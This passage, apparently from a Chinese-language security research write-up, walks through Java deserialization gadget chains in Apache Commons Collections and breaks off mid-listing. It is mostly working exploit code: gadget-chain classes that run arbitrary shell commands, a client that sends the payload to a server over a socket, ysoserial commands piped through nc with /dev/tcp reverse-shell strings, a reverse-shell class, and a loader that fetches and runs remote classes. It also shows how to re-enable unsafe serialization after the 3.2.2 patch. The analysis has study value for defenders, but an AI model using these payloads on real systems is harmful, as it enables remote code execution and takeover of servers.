VulnerableServer 192.168.65.23 1414

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 \
'sh -c $@|sh any echo /bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1' \
| nc -n 192.168.65.23 1414

初看CommonsCollections7.java时产生了一些疑问:

--------------------------------------------------------------------------
a) 初始化ChainedTransformer时能否直接指定有效形参
b) "yy"、"zZ"是怎么确定的
c) 为什么要lazyMap2.remove("yy")
--------------------------------------------------------------------------

问题a一般都是为了避免在数据准备阶段触发什么不想被触发的东西，
CommonsCollections2也曾面临类似的问题，用了不同的解决办法。

问题b，为了理解这事，我去研究了一番String和HashMap的哈希算法，确认"yy"不过
是作者随便指定的一个字符串，"zZ"则是他找到的一个哈希碰撞，二者哈希相等。长
度为2的字符串，找一个哈希碰撞很容易，暴力穷举就是了。

问题c，调试后明白了，在这个上下文中hashtable.put(lazyMap2,2)会隐式调用
lazyMap2.put("yy","yy")，导致lazyMap2与lazyMap1的哈希不再相等，前面的"yy"
与"zZ"白忙活了。为了让lazyMap2与lazyMap1的哈希恢复相等，必须
lazyMap2.remove("yy")。

为什么需要lazyMap2与lazyMap1的哈希相等？作者的注释很到位，反序列化时如果二
者哈希不等，流程不会到达LazyMap.get()。在Hashtable.reconstitutionPut()中设
个断点，动态调试一下就明白。再次强调，不要只看别人的分析，一定要亲自动手调
试，通过后者才能真正明白背后的原理。

8.4) TiedMapEntry利用链

这条利用链本质上是LazyMap利用链。

8.4.1) TiedMapEntryExec.java

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" TiedMapEntryExec.java
 * java -cp "commons-collections-3.1.jar:." TiedMapEntryExec "/bin/touch /tmp/scz_is_here"
 */
import java.io.*;
import java.util.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

public class TiedMapEntryExec
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          cmd         = argv[0];
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( tarray );
        Map             normalMap   = new HashMap();
        Map             lazyMap     = LazyMap.decorate( normalMap, tchain );
        /*
         * https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/keyvalue/TiedMapEntry.html
         *
         * TiedMapEntry(Map map, Object key)
         *
         * 第二形参不必传"foo"，可以是null
         */
        TiedMapEntry    tme         = new TiedMapEntry( lazyMap, null );
        /*
         * 触发相应的Transformer的transform()方法。
         */
        tme.hashCode();
    }
}
```

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
TiedMapEntryExec "/bin/touch /tmp/scz_is_here"

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [8] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [9] org.apache.commons.collections.keyvalue.TiedMapEntry.getValue (TiedMapEntry.java:73), pc = 8
  [10] org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode (TiedMapEntry.java:120), pc = 1
  [11] TiedMapEntryExec.main (TiedMapEntryExec.java:81), pc = 190

从调用栈回溯可以看出，TiedMapEntry.hashCode()最终触发LazyMap.get()。

8.4.2) ConcurrentHashMapExec.java

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" ConcurrentHashMapExec.java
 * java -cp "commons-collections-3.1.jar:." ConcurrentHashMapExec "/bin/touch /tmp/scz_is_here"
 */
import java.io.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.lang.reflect.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

public class ConcurrentHashMapExec
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          cmd         = argv[0];
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( tarray );
        Map             normalMap   = new HashMap();
        Map             lazyMap     = LazyMap.decorate( normalMap, tchain );
        TiedMapEntry    tme         = new TiedMapEntry( lazyMap, null );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/util/concurrent/ConcurrentHashMap.html
         * http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/util/concurrent/ConcurrentHashMap.java
         *
         * ConcurrentHashMap(int initialCapacity)
         */
        ConcurrentHashMap
                        chm         = new ConcurrentHashMap( 1 );
        /*
         * 原始意图是:
         *
         * chm.put( tme, "value" );
         *
         * 但不能直接这么写。因为chm.put()会触发LazyMap.get():
         *
         * ConcurrentHashMap.put
         *   ConcurrentHashMap.putVal
         *     TiedMapEntry.hashCode
         *       TiedMapEntry.getValue
         *         LazyMap.get
         *
         * 必须用反射方式达此目的。
         */
        chm.put( "key", "value" );
        Field           f           = ConcurrentHashMap.class.getDeclaredField( "table" );
        f.setAccessible( true );
        /*
         * 假设前面chm只put()了一次，此处取上来的table[]有两个元素，一个是
         * key=value，另一个是null。这与ConcurrentHashMap在JDK 8中的底层实
         * 现相关。
         */
        Object[]        table       = ( Object[] )f.get( chm );
        /*
         * 本例中一般table[1]是我们要找的，但保险起见，还是这么写吧
         */
        Object          node        = table[1];
        if ( node == null )
        {
            node    = table[0];
        }
        /*
         * 这个"key"是成员变量名
         */
        Field           k           = node.getClass().getDeclaredField( "key" );
        k.setAccessible( true );
        /*
         * 用反射方式修改chm中某个key为tme。这个操作序列相当于但不等价于:
         *
         * chm.put( tme, "value" );
         */
        k.set( node, tme );
        /*
         * 用内存做中转站
         */
        ByteArrayOutputStream
                        bos         = new ByteArrayOutputStream();
        ObjectOutputStream
                        oos         = new ObjectOutputStream( bos );
        oos.writeObject( chm );
        ByteArrayInputStream
                        bis         = new ByteArrayInputStream( bos.toByteArray() );
        ObjectInputStream
                        ois         = new ObjectInputStream( bis );
        /*
         * 通过反序列化ConcurrentHashMap触发LazyMap.get()
         */
        ois.readObject();
    }
}
```

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
ConcurrentHashMapExec "/bin/touch /tmp/scz_is_here"

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [8] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [9] org.apache.commons.collections.keyvalue.TiedMapEntry.getValue (TiedMapEntry.java:73), pc = 8
  [10] org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode (TiedMapEntry.java:120), pc = 1
  [11] java.util.concurrent.ConcurrentHashMap.readObject (ConcurrentHashMap.java:1,447), pc = 42
  [12] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [13] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [14] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [15] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [16] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [17] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [18] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [19] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [20] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [21] ConcurrentHashMapExec.main (ConcurrentHashMapExec.java:139), pc = 336

8.4.3) 简化版调用关系

--------------------------------------------------------------------------
ObjectInputStream.readObject
  ConcurrentHashMap.readObject
    TiedMapEntry.hashCode   // 此处开始TiedMapEntry利用链
      TiedMapEntry.getValue
        LazyMap.get         // 此处开始LazyMap利用链
--------------------------------------------------------------------------

8.4.4) EvilClientWithConcurrentHashMap.java

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" EvilClientWithConcurrentHashMap.java
 */
import java.io.*;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.lang.reflect.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

public class EvilClientWithConcurrentHashMap
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          addr        = argv[0];
        int             port        = Integer.parseInt( argv[1] );
        String          cmd         = argv[2];
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( tarray );
        Map             normalMap   = new HashMap();
        Map             lazyMap     = LazyMap.decorate( normalMap, tchain );
        TiedMapEntry    tme         = new TiedMapEntry( lazyMap, null );
        ConcurrentHashMap
                        chm         = new ConcurrentHashMap( 1 );
        chm.put( "key", "value" );
        Field           f           = ConcurrentHashMap.class.getDeclaredField( "table" );
        f.setAccessible( true );
        Object[]        table       = ( Object[] )f.get( chm );
        Object          node        = table[1];
        if ( node == null )
        {
            node    = table[0];
        }
        Field           k           = node.getClass().getDeclaredField( "key" );
        k.setAccessible( true );
        k.set( node, tme );
        /*
         * 发送序列化数据
         */
        Socket          s_connect   = new Socket( addr, port );
        ObjectOutputStream
                        oos         = new ObjectOutputStream( s_connect.getOutputStream() );
        oos.writeObject( chm );
        oos.close();
        s_connect.close();
    }
}
```

其实没必要写EvilClientWithConcurrentHashMap，ConcurrentHashMapExec已经演示
成功了，比用VulnerableServer演示还省事。不过既然前面已经用C/S架构演示，就
照例来一个C吧。

执行服务端:

java \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

执行客户端:

java \
-cp "commons-collections-3.1.jar:." \
EvilClientWithConcurrentHashMap 192.168.65.23 1414 "/bin/touch /tmp/scz_is_here"

服务端使用8u232时可以得手，不要求服务端使用8u40。

8.4.5) TiedMapEntryExecWithHashSet.java

对应"ysoserial/CommonsCollections6"，这是个单机版。

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" TiedMapEntryExecWithHashSet.java
 * java -cp "commons-collections-3.1.jar:." TiedMapEntryExecWithHashSet "/bin/touch /tmp/scz_is_here"
 */
import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

/*
 * 从ConcurrentHashMapExec.java修改而来
 */
public class TiedMapEntryExecWithHashSet
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          cmd         = argv[0];
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( tarray );
        Map             normalMap   = new HashMap();
        Map             lazyMap     = LazyMap.decorate( normalMap, tchain );
        TiedMapEntry    tme         = new TiedMapEntry( lazyMap, null );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/util/HashSet.html
         * http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/util/HashSet.java
         *
         * HashSet(int initialCapacity)
         */
        HashSet         hs          = new HashSet( 1 );
        /*
         * 原始意图是:
         *
         * hs.add( tme );
         *
         * 用反射方式达此目的。
         *
         * 占位
         */
        hs.add( "anything" );
        Field           f_map       = HashSet.class.getDeclaredField( "map" );
        f_map.setAccessible( true );
        HashMap         hs_hm       = ( HashMap )f_map.get( hs );
        Field           f           = HashMap.class.getDeclaredField( "table" );
        f.setAccessible( true );
        Object[]        table       = ( Object[] )f.get( hs_hm );
        /*
         * 假设前面hs只add()了一次，此处取上来的table[]有两个元素，一个是
         * anything，另一个是null。这与HashSet在JDK 8中的底层实现相关。本
         * 例中一般table[1]是我们要找的，但保险起见，还是这么写吧。
         */
        Object          node        = table[1];
        if ( node == null )
        {
            node    = table[0];
        }
        Field           k           = node.getClass().getDeclaredField( "key" );
        k.setAccessible( true );
        k.set( node, tme );
        ByteArrayOutputStream
                        bos         = new ByteArrayOutputStream();
        ObjectOutputStream
                        oos         = new ObjectOutputStream( bos );
        oos.writeObject( hs );
        ByteArrayInputStream
                        bis         = new ByteArrayInputStream( bos.toByteArray() );
        ObjectInputStream
                        ois         = new ObjectInputStream( bis );
        /*
         * 通过反序列化HashSet触发LazyMap.get()
         */
        ois.readObject();
    }
}
```

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
TiedMapEntryExecWithHashSet "/bin/touch /tmp/scz_is_here"

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [8] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [9] org.apache.commons.collections.keyvalue.TiedMapEntry.getValue (TiedMapEntry.java:73), pc = 8
  [10] org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode (TiedMapEntry.java:120), pc = 1
  [11] java.util.HashMap.hash (HashMap.java:339), pc = 9
  [12] java.util.HashMap.put (HashMap.java:612), pc = 2
  [13] java.util.HashSet.readObject (HashSet.java:342), pc = 215
  [14] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [15] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [16] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [17] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [18] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [19] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [20] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [21] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [22] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [23] TiedMapEntryExecWithHashSet.main (TiedMapEntryExecWithHashSet.java:123), pc = 361

8.4.6) 简化版调用关系

--------------------------------------------------------------------------
ObjectInputStream.readObject
  HashSet.readObject
    HashMap.put
      HashMap.hash
        TiedMapEntry.hashCode   // 此处开始TiedMapEntry利用链
          TiedMapEntry.getValue
            LazyMap.get         // 此处开始LazyMap利用链
--------------------------------------------------------------------------

8.4.7) ysoserial/CommonsCollections6

参[52]，8u232可以得手。

https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java

测试:

nc -l -p 7474

java \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 \
'sh -c $@|sh any echo /bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1' \
| nc -n 192.168.65.23 1414

ysoserial一直没有把"ConcurrentHashMap+TiedMapEntry"加进去，这是出于啥考虑？
CommonsCollections6是"HashSet+TiedMapEntry"。

8.5) Apache Commons Collections 3.2.2的修补方案

参[49]，KINGX说3.2.2对包括InvokerTransformer在内的一些不安全的类增加了安全
检查。

用单机版的ConcurrentHashMapExec测试:

$ java -cp "commons-collections-3.2.2.jar:." ConcurrentHashMapExec "/bin/touch /tmp/scz_is_here"
Exception in thread "main" java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.
        at org.apache.commons.collections.functors.FunctorUtils.checkUnsafeSerialization(FunctorUtils.java:183)
        at org.apache.commons.collections.functors.InvokerTransformer.writeObject(InvokerTransformer.java:155)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at java.io.ObjectStreamClass.invokeWriteObject(ObjectStreamClass.java:1140)
        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1496)
        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)
        at java.io.ObjectOutputStream.writeArray(ObjectOutputStream.java:1378)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1174)
        at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1548)
        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1509)
        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)
        at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1548)
        at java.io.ObjectOutputStream.defaultWriteObject(ObjectOutputStream.java:441)
        at org.apache.commons.collections.map.LazyMap.writeObject(LazyMap.java:137)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at java.io.ObjectStreamClass.invokeWriteObject(ObjectStreamClass.java:1140)
        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1496)
        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)
        at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1548)
        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1509)
        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)
        at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:348)
        at java.util.concurrent.ConcurrentHashMap.writeObject(ConcurrentHashMap.java:1412)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at java.io.ObjectStreamClass.invokeWriteObject(ObjectStreamClass.java:1140)
        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1496)
        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)
        at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:348)
        at ConcurrentHashMapExec.main(ConcurrentHashMapExec.java:131)

在writeObject()阶段就已经触发安全检查。readObject()阶段也有类似检查。

```java
*
 * 用JD-GUI看commons-collections-3.2.2.jar
 */
  private void writeObject(ObjectOutputStream os)
    throws IOException
  {
/*
 * 155行，安全检查
 */
    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);
    os.defaultWriteObject();
  }
```
  static void checkUnsafeSerialization(Class clazz)
  {
    String unsafeSerializableProperty;
    try
    {
      unsafeSerializableProperty = (String)AccessController.doPrivileged(new PrivilegedAction()
      {
        public Object run()
        {
          return System.getProperty("org.apache.commons.collections.enableUnsafeSerialization");
        }
      });
    }
    catch (SecurityException ex)
    {
      unsafeSerializableProperty = null;
    }
    if (!"true".equalsIgnoreCase(unsafeSerializableProperty)) {
/*
 * 183行，如果"org.apache.commons.collections.enableUnsafeSerialization"不
 * 为true，抛异常。
 */
      throw new UnsupportedOperationException("Serialization support for " + clazz.getName() + " is disabled for security reasons. " + "To enable it set system property '" + "org.apache.commons.collections.enableUnsafeSerialization" + "' to 'true', " + "but you must ensure that your application does not de-serialize objects from untrusted sources.");
    }
  }
```

这样可以得手:

java \
-Dorg.apache.commons.collections.enableUnsafeSerialization=true \
-cp "commons-collections-3.2.2.jar:." \
ConcurrentHashMapExec "/bin/touch /tmp/scz_is_here"

8.6) 利用java.net.URLClassLoader干复杂的事

参[53]，iswin演示的攻击链上用到java.net.URLClassLoader，可以干复杂的事。秉
承一贯理念，从易到难，先来一个反射版本，再来一个利用Transformer机制的非序
列化版本，最后来一个反序列化攻击链版本。

8.6.1) ConnectShellEx.java

```java
*
 * javac -encoding GBK -g ConnectShellEx.java
 */
import java.io.*;

public class ConnectShellEx
{
    public ConnectShellEx ( Object[] argv )
    {
        String  addr    = ( String )argv[0];
        int     port    = Integer.parseInt( ( String )argv[1] );
        /*
         * "/bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1"
         */
        String  cmd     = String.format
        (
            "/bin/sh -i > /dev/tcp/%s/%d  0<&1 2>&1",
            addr,
            port
        );

        try
        {
            /*
             * exec()效果相当于:
             *
             * nc -n 192.168.65.23 7474 -e /bin/sh

             * 需要在192.168.65.23上配合执行:
             *
             * nc -l -p 7474
             */
            Runtime.getRuntime().exec( new String[] { "/bin/sh", "-c", cmd } );
        }
        catch ( IOException e )
        {
            e.printStackTrace();
        }
    }
}
```

这是将来通过EvilURLClassLoader执行的恶意类，其构造函数包含恶意代码。

8.6.2) EvilURLClassLoader.java

```java
*
 * javac -encoding GBK -g EvilURLClassLoader.java
 */
import java.io.*;
import java.net.*;
import java.util.*;

public class EvilURLClassLoader
{
    public static void main ( String[] argv ) throws Exception
    {
        /*
         * 聚焦原始意图，未做错误检查
         */
        String      evilurl     = argv[0];
        String      evilclass   = argv[1];
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/util/Arrays.html
         *
         * public static <T> T[] copyOfRange(T[] original, int from, int to)
         *
         * 左闭右开区间
         */
        String[]    evilparam   = Arrays.copyOfRange
        (
            argv,
            2,
            argv.length
        );

        (
            /*
             * 必须有这个强制类型转换，因为invoke()返回值类型是Object，没
             * 法直接loadClass()。
             *
             * https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html
             *
             * Method getMethod(String name, Class<?>... parameterTypes)
             */
            ( URLClassLoader )URLClassLoader.class.getMethod
            (
                /*
                 * https://docs.oracle.com/javase/8/docs/api/java/net/URLClassLoader.html
                 *
                 * static URLClassLoader newInstance(URL[] urls)
                 *
                 * 这是个静态方法
                 */
                "newInstance",
                new Class[]
                {
                    URL[].class
                }
                /*
                 * https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Method.html
                 *
                 * Object invoke(Object obj, Object... args)
                 */
            ).invoke
            (
                /*
                 * newInstance()是静态方法，所以这里是null
                 */
                null,
                new Object[]
                {
                    new URL[]
                    {
                        new URL( evilurl )
                    }
                }
            )
            /*
             * https://docs.oracle.com/javase/8/docs/api/java/lang/ClassLoader.html
             *
             * Class<?> loadClass(String name)
             */
        ).loadClass
        (
            evilclass
            /*
             * https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html
             *
             * Constructor<T> getDeclaredConstructor(Class<?>... parameterTypes)
             *
             * getConstructor()只能返回public的，getDeclaredConstructor()
             * 没有这个限制。
             */
        ).getDeclaredConstructor
        (
            new Class[]
            {
                Object[].class
            }
            /*
             * https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Constructor.html
             *
             * public T newInstance(Object... initargs)
             *
             * 从evilurl加载恶意jar包，执行evilclass指定的恶意类的恶意构造
             * 函数。
             */
        ).newInstance
        (
            /*
             * 这里随便定制，与evilclass强相关
             */
            new Object[]
            {
                evilparam
            }
        );
    }
}
```

上述代码用反射方式实现:

```java
*
 * 把恶意URL弄到CLASSPATH中来
 */
ucl =   new URLClassLoader( new URL[] { new URL( evilurl ) } ) );
/*
 * 远程加载恶意类
 */
ucl.loadClass( evilclass );
/*
 * 执行恶意类的恶意构造函数
 */
new evilclass( evilparam );
--------------------------------------------------------------------------

8.6.3) 测试EvilURLClassLoader

假设目录结构是:

.
|
+---test0
|
+---test1
|       ConnectShellEx.class
|
\---test2
        EvilURLClassLoader.class

在test0目录执行:

nc -l -p 7474

在test1目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test2目录执行:

java EvilURLClassLoader http://192.168.65.23:8080/ ConnectShellEx 192.168.65.23 7474

回到前面那个nc，已经得到一个shell，其uid对应EvilURLClassLoader进程的euid。
可以在这个shell里执行"ps -f -o pid,user,args"看看。

ConnectShellEx可以是任意其他实现，如果构造函数形参有变，EvilURLClassLoader
也要做相应修改。

8.6.4) EvilURLClassLoaderWithTransformer.java

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" EvilURLClassLoaderWithTransformer.java
 */
import java.io.*;
import java.net.*;
import java.util.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

public class EvilURLClassLoaderWithTransformer
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          evilurl     = argv[0];
        String          evilclass   = argv[1];
        String[]        evilparam   = Arrays.copyOfRange
        (
            argv,
            2,
            argv.length
        );

        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( URLClassLoader.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
